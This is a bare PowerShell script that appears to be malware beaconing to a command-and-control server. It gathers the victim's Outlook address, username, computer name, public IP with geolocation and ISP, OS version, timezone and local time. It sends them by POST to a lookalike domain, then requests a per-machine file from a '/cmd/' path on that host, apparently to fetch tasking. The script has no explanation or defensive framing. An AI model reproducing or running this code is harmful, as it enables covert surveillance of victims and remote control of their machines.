if (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\OUTLOOK.EXE  -ErrorAction SilentlyContinue)  {;
    $outlook = New-Object  -ComObject Outlook.Application;
    $emailAddress = $outlook.Session.CurrentUser.Address;
    $data.Add('email', $emailAddress);
};
$email = (Get-WmiObject  -Class 'Win32_ComputerSystem' | Select-Object -ExpandProperty UserName) -replace '.*\\','';
$pc_name = $env:COMPUTERNAME;
$ip_info = (New-Object System.Net.WebClient).DownloadString('https://ipinfo.io/json') | ConvertFrom-Json;
$ip_address = $ip_info.ip;
$city = $ip_info.city;
$region = $ip_info.region;
$country = $ip_info.country;
$isp_name = $ip_info.org;
$os_info = Get-CimInstance Win32_OperatingSystem;
$os_name = $os_info.Caption;
$timezone = (Get-TimeZone).DisplayName;
$local_time = Get-Date -Format 'yyyy-MM-dd HH:mm:ss';
$data = @{
    pc_name = $pc_name;
    ip_address = $ip_address;
    city = $city;
    region = $region;
    country = $country;
    isp_name = $isp_name;
    os_name = $os_name;
    timezone = $timezone;
    message = 'LMI Updated';
    local_time = $local_time;
    email = $email 
};
Invoke-WebRequest -Uri 'https://file.onli-ne.com/track/index.php' -Method POST -Body $data;
Invoke-WebRequest -Uri "https://file.onli-ne.com/cmd/sysfiles/$env:COMPUTERNAME.ccc"